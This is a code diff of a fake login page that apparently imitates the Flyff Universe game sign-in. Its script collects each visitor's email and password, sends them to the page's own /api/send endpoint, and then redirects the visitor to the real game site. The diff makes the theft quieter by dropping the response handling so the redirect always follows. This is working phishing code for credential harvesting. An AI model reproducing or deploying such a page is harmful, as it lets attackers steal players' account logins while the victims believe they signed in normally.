@@ -239,7 +239,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 
     <div class="separator mt-5">Or continue with</div>
         
-<form method="POST" action="/api/send" class="mt-5" id="captcha-form">
+<form class="mt-5" id="captcha-form">
     <input type="hidden" name="_token" value="z0fHaPgV3X7NyG4EoKx5RZkTb9e0Nrenn8z1IcKY" autocomplete="off">
 
   <div class="mb-3">
@@ -275,6 +275,8 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
   </div>
 </form>
 
+
+
 <script>
 document.addEventListener('DOMContentLoaded', function () {
   const form = document.getElementById('captcha-form');
@@ -288,13 +290,14 @@ document.addEventListener('DOMContentLoaded', function () {
     const remember = document.getElementById('remember')?.checked || false;
 
     try {
-      const response = await fetch('/api/send', {
+      await fetch('/api/send', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email, password, remember })
       });
-
-      const data = await response.json();
+    } catch (err) {
+      console.error(err);
+    }
 
 setTimeout(() => {
   window.location.href = "https://universe.flyff.com/play";
@@ -302,6 +305,7 @@ setTimeout(() => {
   });
 });
 </script>
+            
             
                             <hr>
 
